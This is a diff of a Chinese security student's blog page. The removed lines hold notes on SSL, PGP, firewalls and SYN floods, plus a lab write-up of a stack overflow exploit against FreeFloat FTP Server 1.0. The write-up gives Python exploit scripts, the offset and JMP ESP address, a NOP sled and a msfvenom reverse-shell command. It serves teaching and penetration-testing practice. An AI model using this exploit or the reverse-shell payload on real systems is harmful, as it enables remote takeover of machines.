-<h3 id="运输层安全协议"><a href="#运输层安全协议" class="headerlink" title="运输层安全协议"></a>运输层安全协议</h3><h4 id="安全套接层SSL"><a href="#安全套接层SSL" class="headerlink" title="安全套接层SSL"></a>安全套接层SSL</h4><ul>
-<li>SSL是安全套接层(Secure Socket Layer)，可对万维网客户与服务器之间传送的数据进行加密和鉴别。</li>
-<li>SSL在双方的联络阶段协商将使用的加密算法和密钥，以及客户与服务器之间的鉴别。</li>
-<li>在联络阶段完成之后，所有传送的数据都使用在联络阶段商定的会话密钥</li>
-<li>SSL不仅被所有常用的浏览器和万维网服务器所支持，而且也是运输层安全协议TLS(Transport Layer Secutiry)的基础。</li>
-</ul>
-<h4 id="HTTP与HTTPS"><a href="#HTTP与HTTPS" class="headerlink" title="HTTP与HTTPS"></a>HTTP与HTTPS</h4><p>HTTPS就是加了SSL的HTTP</p>
-<ul>
-<li>端口不同：Http与Http使用不同的连接方式，用的端口也不一样，前者是80，后者是443；</li>
-<li>资源消耗：和HTTP通信相比，Https通信会由于加减密处理消耗更多的CPU和内存资源；</li>
-<li>开销：Https通信需要证书，而证书一般需要向认证机构购买； 
-　 </li>
-</ul>
-<h5 id="SSL的位置"><a href="#SSL的位置" class="headerlink" title="SSL的位置"></a>SSL的位置</h5><p><img src="https://pic3.superbed.cn/item/5de4adf7119afd7d7ec55a48.jpg" alt=""></p>
-<ul>
-<li>在发送方，SSL接收应用层的数据(HTTP报文或IMAP报文)，对数据进行加密，然后把加密的数据送往TCP套接字</li>
-<li>在接收方，SSL从TCP套接字读取数据，解密后把数据交给应用层。</li>
-</ul>
-<h5 id="SSL提供以下三个功能"><a href="#SSL提供以下三个功能" class="headerlink" title="SSL提供以下三个功能"></a>SSL提供以下三个功能</h5><ul>
-<li>SSL服务器鉴别：允许用户证实服务器的身份。具有SSL功能的浏览器维持一个表，上面有一些可信赖的CA和它们的公钥</li>
-<li>加密SSL会话：客户和服务器交互的所有数据都在发送方加密，在接收方解密</li>
-<li>SSL客户鉴别:允许服务器证实客户身份</li>
-</ul>
-<h4 id="安全电子交易SET"><a href="#安全电子交易SET" class="headerlink" title="安全电子交易SET"></a>安全电子交易SET</h4><p>安全电子交易SET(Secure Electronic Transaction)是专为在因特网上进行安全支付卡交易的协议<br>SET的主要特点是：</p>
-<ul>
-<li>SET是专门为与支付有关的报文进行加密的</li>
-<li>SET协议涉及到三方，即顾客、商家和商业银行。所有在这三方之间交互的敏感信息都被加密</li>
-<li>SET要求这三方都有证书。在SET交易中，商家看不见顾客传送给商业银行的信用卡号码</li>
-</ul>
-<h3 id="应用层的安全协议"><a href="#应用层的安全协议" class="headerlink" title="应用层的安全协议"></a>应用层的安全协议</h3><h4 id="PGP-Pretty-Good-Privacy"><a href="#PGP-Pretty-Good-Privacy" class="headerlink" title="PGP(Pretty Good Privacy)"></a>PGP(Pretty Good Privacy)</h4><ul>
-<li>PGP是一个完整的电子邮件安全软件包，包括加密、鉴别、电子签名和压缩等技术</li>
-<li>PGP并没有使用新的概念，它只是将一些算法如MD5,RSA等综合在一起</li>
-</ul>
-<h4 id="PEM-Privacy-Enhanced-Mail"><a href="#PEM-Privacy-Enhanced-Mail" class="headerlink" title="PEM(Privacy Enhanced Mail)"></a>PEM(Privacy Enhanced Mail)</h4><p>PEM是因特网的邮件加密建议标准，由4个RFC文档来描述。PEM的主要特点有：</p>
-<ul>
-<li>PEM与PGP一样都是对基于RFC 822的电子邮件进行加密和鉴别</li>
-<li>PEM 有比PGP更完善的密钥管理机制</li>
-</ul>
-<h2 id="链路加密和端到端解密"><a href="#链路加密和端到端解密" class="headerlink" title="链路加密和端到端解密"></a>链路加密和端到端解密</h2><h3 id="链路加密"><a href="#链路加密" class="headerlink" title="链路加密"></a>链路加密</h3><p>在采用链路加密的网络中，每条通信链路上的加密都是独立实现的，通常对每条链路使用不同的加密密钥。<br><img src="https://pic2.superbed.cn/item/5de4ae12119afd7d7ec56326.jpg" alt=""><br>相邻结点之间具有相同的密钥，因而密钥管理意义实现，链路加密对于用户来说是透明的(用户看不见)，因为加密功能由通信子网提供</p>
-<h3 id="端到端加密"><a href="#端到端加密" class="headerlink" title="端到端加密"></a>端到端加密</h3><p>端到端加密是在源结点和目的结点对传送的PDU进行加密和解密，报文的安全性不会因中间结点的不可靠而受到影响。<br><img src="https://pic3.superbed.cn/item/5de4ae37119afd7d7ec56d48.jpg" alt=""><br>在端到端加密的情况下，PDU的控制信息部分(如源结点地址、目的结点地址、路由信息等)不能被加密，否则中间结点就不能正确选择路由。</p>
-<h2 id="防火墙-firewall"><a href="#防火墙-firewall" class="headerlink" title="防火墙(firewall)"></a>防火墙(firewall)</h2><ul>
-<li>防火墙是由软件、硬件构成的系统。是一种特殊编程的路由器，用来在两个网络之间实施接入控制策略。</li>
-<li>防火墙内的网络称为“可信赖的网络”，而外部的因特网称为“不可信赖的网络”</li>
-</ul>
-<h3 id="防火墙在互连网络中的位置"><a href="#防火墙在互连网络中的位置" class="headerlink" title="防火墙在互连网络中的位置"></a>防火墙在互连网络中的位置</h3><p><img src="https://pic2.superbed.cn/item/5df58f24a4fbc8614a789c7d.jpg" alt=""></p>
-<h3 id="防火墙的功能"><a href="#防火墙的功能" class="headerlink" title="防火墙的功能"></a>防火墙的功能</h3><p>防火墙的功能有两个：阻止和允许</p>
-<ul>
-<li>阻止就是阻止某种类型的通信量通过防火墙(外部网络和内部网络双向阻止)</li>
-<li>允许的功能与阻止恰好相反</li>
-</ul>
-<h3 id="防火墙分类"><a href="#防火墙分类" class="headerlink" title="防火墙分类"></a>防火墙分类</h3><ul>
-<li>网络级防火墙：用来防止整个网络出现外来非法的入侵。具有分组过滤和授权服务器。分组过滤检查<br>所有流入本网络的信息，然后拒绝不符合实现制定好的一套准则的数据，而后者则是检查用户的登录是否合法</li>
-<li>应用级防火墙：从应用程序来进行接入控制。通常使用应用网关或代理服务器来区分各种应用。例如，可以只允许通过访问万维网的应用，而阻止FTP应用的通过。</li>
-</ul>
-<h2 id="DDos攻击"><a href="#DDos攻击" class="headerlink" title="DDos攻击"></a>DDos攻击</h2><p>客户端不断进行请求链接：服务器端会为每个请求创建一个链接，并向其发送确认报文，然后等待客户端进行确认</p>
-<h3 id="DDos攻击原理"><a href="#DDos攻击原理" class="headerlink" title="DDos攻击原理"></a>DDos攻击原理</h3><ul>
-<li>客户端向服务端发送请求链接数据包</li>
-<li>服务端向客户端发送确认数据包</li>
-<li>客户端不向服务端发送确认数据包，服务器一直等待来自客户端的确认</li>
-</ul>
-<h3 id="DDos预防"><a href="#DDos预防" class="headerlink" title="DDos预防"></a>DDos预防</h3><ul>
-<li>限制同时打开SYN半链接的数目</li>
-<li>缩短SYN半链接的Time out 时间</li>
-<li>关闭不必要的服务</li>
-</ul>
-
-      
+    <div class="row">
+        <div class="col l8 offset-l2 m10 offset-m1 s10 offset-s1 center-align text">
+            此博客是私人博客，用于记录一名程序媛的养成之路。博主是一个信息安全专业的大学生，博客内容基本都与计算机相关，博客中有错误的地方还请大家包涵指正，欢迎各位交流指导！
+        </div>
     </div>
-    <footer class="article-footer">
-      <a data-url="https://fightingtree.github.io/2019/12/01/network2/" data-id="ck5ewyp02002ki8tw5g6l72xw" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a></li></ul>
+</div>
+                    
 
-    </footer>
-  </div>
-  
-</article>
+                    
+
+                    
+
+                    <div id="recommend-sections" class="recommend">
+                        
 
 
-  
-    <article id="post-FTP" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/11/26/FTP/" class="article-date">
-  <time datetime="2019-11-26T05:11:44.000Z" itemprop="datePublished">2019-11-26</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
-  </div>
 
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/11/26/FTP/">FTP溢出漏洞分析</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><ul>
-<li>缓冲区：暂时置放输出或输入资料的内存</li>
-<li>缓冲区溢出：缓冲区溢出是指当计算机向缓冲区填充数据时超出了缓冲区本身的容量，溢出的数据覆盖在合法数据上。</li>
-</ul>
-<h2 id="溢出漏洞测试"><a href="#溢出漏洞测试" class="headerlink" title="溢出漏洞测试"></a>溢出漏洞测试</h2><h3 id="测试准备"><a href="#测试准备" class="headerlink" title="测试准备"></a>测试准备</h3><ul>
-<li>渗透测试目标：FreeFloat FTP Server1.0，该软件带有溢出漏洞</li>
-<li>WindowsXP系统:将该软件放入WindowsXP中，IP地址为192.168.75.130</li>
-<li>Windows 7系统：对该软件进行测试，该主机需带装有python运行环境，IP地址为192.168.75.131。</li>
-<li>Kali Linux系统</li>
-</ul>
-<h3 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h3><h4 id="在WindowsXP中运行软件"><a href="#在WindowsXP中运行软件" class="headerlink" title="在WindowsXP中运行软件"></a>在WindowsXP中运行软件</h4><p>如图所示：<br><img src="https://pic3.superbed.cn/item/5df5bba3a4fbc8614a805eb2.jpg" alt=""></p>
-<h4 id="在Windows7中开始测试"><a href="#在Windows7中开始测试" class="headerlink" title="在Windows7中开始测试"></a>在Windows7中开始测试</h4><h5 id="正常登录"><a href="#正常登录" class="headerlink" title="正常登录"></a>正常登录</h5><p>在终端依次输入以下命令连接FTP：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp</span><br><span class="line">open 192.168.75.130  //WindowsXP的IP地址</span><br></pre></td></tr></table></figure>
-<p>输入任意用户名和密码登录到FTP，如图所示：<br><img src="https://pic2.superbed.cn/item/5df5bd1aa4fbc8614a809a19.jpg" alt=""></p>
-<p>现在我们已经成功登录，可以使用FTP中的任意资源了。(这里使用任何一个用户名都可以成功登录)</p>
-<h5 id="溢出测试"><a href="#溢出测试" class="headerlink" title="溢出测试"></a>溢出测试</h5><p>我们重复正常登录的步骤，只不过此次测试的用户名和密码我们可以输入超长字符串进行测试，测试的同时使用wiresharke进行抓包分析：<br>测试1(超长字符串a，字符串长度随机)：<br><img src="https://pic2.superbed.cn/item/5df5be68a4fbc8614a80ec2e.jpg" alt=""><br>对上述操作所抓取的数据包如下所示：<br><img src="https://pic3.superbed.cn/item/5df5c192a4fbc8614a819df9.jpg" alt=""></p>
-<p>测试2(超长字符串b，字符串长度随机)：<br><img src="https://pic2.superbed.cn/item/5df5c4cea4fbc8614a822fa3.jpg" alt=""><br>对上述操作所抓取的数据包如下所示：<br><img src="https://pic.superbed.cn/item/5df5c803a4fbc8614a82bb2b.jpg" alt=""></p>
-<p>进行上述测试后，我们发现目标的系统仍然正常登录，系统并没有崩溃。但是，对数据包进行分析，我们会发现不论我们随机输入多少超长字符串，最终发送的只有78个字符(a、b)，显然这个长度的字符串无法引起溢出，但是我们可以通过自行构造数据包，然后将数据包发送出去。</p>
-<h5 id="用Python编写数据包"><a href="#用Python编写数据包" class="headerlink" title="用Python编写数据包"></a>用Python编写数据包</h5><p>在Windows 7中安装Python运行环境(IDLE),在IDLE中执行下列代码：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import socket  <span class="comment">#导入需要使用的socket库</span></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)  <span class="comment">#创建一个套接字</span></span><br><span class="line">connect = s.connect((<span class="string">'192.168.75.130'</span>)，21)     <span class="comment">#利用套接字建立目标的连接</span></span><br><span class="line">s.send(<span class="string">'USER aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r\n'</span>)     <span class="comment">#通过套接字将随机超长字符串(上百位)以数据包的形式发送出去</span></span><br></pre></td></tr></table></figure>
-<p>在WindowsXP界面出现如下窗口则证明发送溢出：<br><img src="https://i.postimg.cc/Vs241S6h/7.jpg" alt=""><br>点击生成错误报告，可以查看发生错误的地址信息：<br><img src="https://i.postimg.cc/HsQ0gBFJ/8.png" alt=""></p>
-<h3 id="计算软件溢出的偏移地址"><a href="#计算软件溢出的偏移地址" class="headerlink" title="计算软件溢出的偏移地址"></a>计算软件溢出的偏移地址</h3><p>EIP寄存器：用来存储CPU要读取指令的地址<br>根据错误报告的地址信息，以及溢出原理，出现这种情况的原因是下一条保存地址的EIP寄存器中的地址被溢出的字符“a”所覆盖,”\x61”(16进制)在ASCII表中表示的就是字符’a,也就是说现在EIP寄存器的内容就是’aaaa’,而操作系统无法在这个位置找到一条可以执行的命令，从而引发系统的崩溃。</p>
-<p>我们可以在错误报告中看到EIP寄存器的地址，但是程序在操作系统中的执行是动态的，也就是说每一次这个软件执行时所分配的地址都是不同的，所以我们现在需要知道EIP寄存器相对于输入数据起始位置的相对偏移。</p>
-<h4 id="借助Metasploit计算溢出的相对偏移地址"><a href="#借助Metasploit计算溢出的相对偏移地址" class="headerlink" title="借助Metasploit计算溢出的相对偏移地址"></a>借助Metasploit计算溢出的相对偏移地址</h4><p>要计算EIP寄存器相对于输入数据起始位置的相对偏移，需要使用Metasploit中内置的两个工具<font color="#fb8c00">pattern_create</font>和<font color="#fb8c00">pattern_offset</font></p>
-<h5 id="使用pattern-create创建字符串"><a href="#使用pattern-create创建字符串" class="headerlink" title="使用pattern_create创建字符串"></a>使用pattern_create创建字符串</h5><p>pattern_create可以用来创建一段没有重复字符的文本，我们将这段文本发送到目标服务器，当发生溢出时，记录下程序发生错误的地址(也就是EIP中的内容)，这个地址其实就是文本中的四个字符。</p>
-<p>启动Kali，打开终端输入以下指令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/share/metasploit-framework/tools/exploit</span><br><span class="line">./pattern_create.rb -h  //pattern_create.rb是一个由ruby语言编写的脚本，使用-h参数可以查看可以使用的参数以及用法</span><br><span class="line">./pattern_create.rb -l 500 //生成一段500个字符的文本</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq</span><br></pre></td></tr></table></figure>
-<p>在python编写的数据包将send()函数传递的超长字符串换为上述文本，即在编写数据包部分将最后的传输数据部分替换为：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.send(<span class="string">'USER Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq\r\n'</span>)</span><br></pre></td></tr></table></figure>
-<p>同样地，该超长字符串会引发windowsXP中的FTP软件的溢出错误，我们同样可以根据错误报告获得溢出的地址：<br><img src="https://i.postimg.cc/wjqNdHhP/9.png" alt=""></p>
-<h5 id="使用pattern-offset计算偏移地址"><a href="#使用pattern-offset计算偏移地址" class="headerlink" title="使用pattern_offset计算偏移地址"></a>使用pattern_offset计算偏移地址</h5><p>在Kali终端输入以下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/share/metasploit-framework/tools/exploit</span><br><span class="line">./pattern_offset.rb -h  //查看帮助</span><br><span class="line">./pattern_offset.rb -q 37684136 -l 500 //-q后的参数为上述错误报告中的出错地址，-l为pattern_create中生成字符串的长度</span><br><span class="line"></span><br><span class="line">输出结果：230</span><br></pre></td></tr></table></figure>
-<p>上述命令的输出结果230就是EIP寄存器相对于输入数据起始位置的相对偏移，所以我们只需提供230个字符”a”就可以使FTP发生溢出错误。我们重复之前的步骤，将python构建数据包的步骤改为执行下列代码：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">buf = <span class="string">"\x61"</span>*230+<span class="string">"\x62"</span>*4  //230个<span class="string">'a'</span>字符，4个<span class="string">'b'</span>字符</span><br><span class="line">target = <span class="string">"192.168.75.130"</span>  //FTP所在主机的IP地址</span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((target,21))</span><br><span class="line">s.send(<span class="string">"USER "</span>+buf+<span class="string">"\r\n"</span>)</span><br><span class="line">s.close()   //关闭套接字</span><br></pre></td></tr></table></figure>
-<p>执行结束后可以看到FTP程序已经崩溃，并且产生如下图所示错误报告：<br><img src="https://i.postimg.cc/0yXzRS5M/10.png" alt=""><br>从上图的错误地址62626262可以看出，EIP的地址已经为字符“bbbb”，这验证了我们找到的偏移地址的正确性。</p>
-<h3 id="查找JMP-ESP指令"><a href="#查找JMP-ESP指令" class="headerlink" title="查找JMP ESP指令"></a>查找JMP ESP指令</h3><p>ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶<br>EBP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。</p>
-<p>因为操作系统在程序的每一次执行过程中都会为其分配不同的地址，所以即使我们可以决定程序下一步执行的地址(EIP中的内容)，但是不知道我们的攻击载荷位于哪个位置，所以还是没有办法让目标服务器执行这个恶意的攻击载荷。</p>
-<p>接下来我们就要想个办法，让EIP中的地址指向我们的攻击载荷，我们首先需要看一下输入的用户名数据在执行时是如何分布的，如下图所示：<br><img src="https://i.postimg.cc/nccVFLPv/11.jpg" alt=""></p>
-<p>按照栈的设计，ESP寄存器应该就位于EIP寄存器之后(中间可能有一些空隙)，如下图所示：<br><img src="https://i.postimg.cc/rmn3rRqK/12.jpg" alt=""><br>因为这种设计，ESP寄存器就是我们最理想的选择，原因如下：</p>
-<ol>
-<li>我们在使用大量字符来溢出栈的时候，也可以使用特定的字符来覆盖ESP</li>
-<li>我们虽然无法对ESP寄存器进行定位，但是可以利用一条“JMP ESP”(汇编指令)的跳转指令来实现跳转到当前ESP寄存器。</li>
-</ol>
-<h4 id="查找地址不会改变的JMP-ESP指令"><a href="#查找地址不会改变的JMP-ESP指令" class="headerlink" title="查找地址不会改变的JMP ESP指令"></a>查找地址不会改变的JMP ESP指令</h4><p>接下来，我们需要做的工作是找到一条地址不会发生改变的JMP ESP指令。</p>
-<ul>
-<li>ntdll.dll(NT Layer DLL)是Windows NT操作系统的重要模块，属于系统级别的文件。用于堆栈释放、进程管理。</li>
-<li>kernel32.dll是Windows 9x/Me中非常重要的32位动态链接库文件，属于内核级文件，它控制着系统的内存管理、数据的输入输出操作和中断处理，当Windows启动时，kernel.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域。</li>
-<li>一些经常会用到的动态链接会被映射到内存，如kernel32.dll、user32.dll会被几乎所有进程加载，且加载的基址始终相同(不同的操作系统可能不同)。我们只需在这些动态链接库中找到JMP ESP命令就可以了，此时我们找到的JMP ESP的地址就一直都不会变。</li>
-</ul>
-<p>dll文件中的JMP ESP指令的地址可以通过调试器或代码执行找到。</p>
-<h3 id="编写渗透测试程序"><a href="#编写渗透测试程序" class="headerlink" title="编写渗透测试程序"></a>编写渗透测试程序</h3><h4 id="字节序"><a href="#字节序" class="headerlink" title="字节序"></a>字节序</h4><p>现在我们找到的JMP ESP指令的地址(假设为7C9D30D7)还存在一个问题，同样的地址数据在网络传输和CPU存储时的表示方法是不同的：</p>
-<ul>
-<li>大端(Big-Endian)：高位在前(其中“前”是指靠近内存的低地址，存储在硬盘上就是先写的字节)</li>
-<li>小端(Little-Endian):低位在前(低位字节存储在内存低地址，字节高低顺序和内存高低顺序相同)</li>
-</ul>
-<p>网络字节序(Network Byte Order)一般指大端(对大部分网络传输协议而言)，大小端的概念是面向多字节数据类型的存储方式定义的。</p>
-<h4 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h4><p>我们找到的JMP ESP的地址(7C9D30D7)其实是小端格式，如果我们希望使用7C9D30D7来覆盖目标地址，在使用Python编写渗透程序时就应该倒置地址’\xD7\x30\x9D\x7C’<br>此时，我们的脚本应为：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">connect = s.connect((<span class="string">'192.168.75.130'</span>,21))</span><br><span class="line">buf = <span class="string">"\x61"</span>*230+<span class="string">"\xD7\x30\x9D\x7C"</span>  //填充230个<span class="string">'a'</span>后到达EIP寄存器，<span class="string">"\xD7\x30\x9D\x7C"</span>就是此时EIP寄存器中的内容</span><br><span class="line">s.send(<span class="string">'USER'</span>+buf+<span class="string">"\r\n"</span>)</span><br></pre></td></tr></table></figure>
-<p>要对目标主机进行缓冲区溢出攻击，只需在传送的数据之后加上我们想要目标计算机上执行的代码即可(即payload)，详情请对shellcode编程进行了解，下文我们采用shellcode代替这部分代码：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">connect = s.connect((<span class="string">'192.168.75.130'</span>,21))</span><br><span class="line">buf = <span class="string">"\x61"</span>*230+<span class="string">"\xD7\x30\x9D\x7C"</span>+shellcode  //填充230个<span class="string">'a'</span>后到达EIP寄存器，<span class="string">"\xD7\x30\x9D\x7C"</span>就是此时EIP</span><br><span class="line">寄存器中的内容</span><br><span class="line">s.send(<span class="string">'USER'</span>+buf+<span class="string">"\r\n"</span>)</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>注：shellcode也可以使用metasploit来生成： msfvenom -p windows/shell_reverse_tcp LHOST=192.168.75.129 LPORT=443 -b ‘\x00\x0a\x40’(坏字符) -f c</p>
-</blockquote>
-<h5 id="加入空指令"><a href="#加入空指令" class="headerlink" title="加入空指令"></a>加入空指令</h5><p>完成上述操作后，目标的系统FTP已经崩溃，但是，我们的shell代码却没有启动，原因就是ESP的地址向后发生了偏移，这样就导致了shellcode的代码并没有完全载入到ESP中，最前面的一部分在ESP的外面，从而导致程序不能正常执行。</p>
-<p>解决上述问题的一个方法就是加入空指令”\x90”(NOPS),这个指令不会执行任何实际操作，但它也是一条指令，因此会顺序地向下执行这样即使我们不知道ESP的真实地址，只需要在EIP后面添加一些空指令，只要这些空指令足够多到将shellcode偏移进ESP，就可以顺利执行shellcode。所以此时，我们的脚本代码中的buf应该改为以下代码：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf = <span class="string">"\x61"</span>*230+<span class="string">"\xD7\x30\x9D\x7C"</span>+<span class="string">"\x90"</span>*20+shellcode //</span><br></pre></td></tr></table></figure>
-
-<h3 id="坏字符"><a href="#坏字符" class="headerlink" title="坏字符"></a>坏字符</h3><p>虽然上述渗透测试程序编写得很成功，但是在实际中却未必如此顺利。我们在上述示例中发送的数据都是FTP用户名的内容，如果FTP对用户名输入有限制，并过滤了一些字符，而我们的shellcode中也包含了这种不被允许的字符，就可能导致FTP服务器拒绝接收后面的内容，从而导致代码只传了一部分。所以找出坏字符也是我们溢出漏洞攻击的一个重要环节。</p>
-
-      
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
-    <footer class="article-footer">
-      <a data-url="https://fightingtree.github.io/2019/11/26/FTP/" data-id="ck5ewyoze000ei8twa6qz1xsg" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-penetrationTest5" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/11/24/penetrationTest5/" class="article-date">
-  <time datetime="2019-11-24T09:59:42.000Z" itemprop="datePublished">2019-11-24</time>
-</a>
     
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
-  </div>
 
-  </div>
-  <div class="article-inner">
     
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/11/24/penetrationTest5/">渗透测试(5)</a>
-    </h1>
-  
 
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h2><h3 id="Metasploit基础"><a href="#Metasploit基础" class="headerlink" title="Metasploit基础"></a>Metasploit基础</h3><p>Metasploit是一个集成了多个漏洞测试工具的框架。Metaslpoit在kali中已经内置，启动只需在终端输入以下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-<p>启动后显示的模板如下：<br><img src="https://i.postimg.cc/v8Px4Y9k/1.jpg" alt=""><br>第一行给出当前Metasploit的版本，其中包含了7个模块：1949个exploits，1089个auxiliary,334个posts，558个payloads,<br>45个encoders,10个nops，7个evasion</p>
-<h4 id="常用模块的作用"><a href="#常用模块的作用" class="headerlink" title="常用模块的作用"></a>常用模块的作用</h4><ul>
-<li>漏洞渗透模块(exploits)：用于发现漏洞后对漏洞进行利用。每一个模块对应着一个漏洞，发现了目标的漏洞后，我们无需知道漏洞是怎样产生的，甚至无需会编程，只需要知道漏洞的名字，然后执行对应的漏洞模块，就可以实现对目标的入侵。</li>
-<li>辅助模块(auxiliary)：进行信息收集的模块，例如一些信息侦查、网络扫描类的工具。</li>
-<li>攻击载荷模块(payloads)：被控端程序，可以帮助我们在目标上完成远程控制操作，通常这些模块既可以单独执行，也可以和漏洞渗透模块一起执行</li>
-<li>后渗透攻击模块(post)：当我们成功获取目标的控制权后，这类模块就能帮助我们提高控制权限、获取敏感信息、实施跳板攻击等</li>
-<li>evasion模块：创建反杀毒软件的木马(绕过杀毒软件)</li>
-</ul>
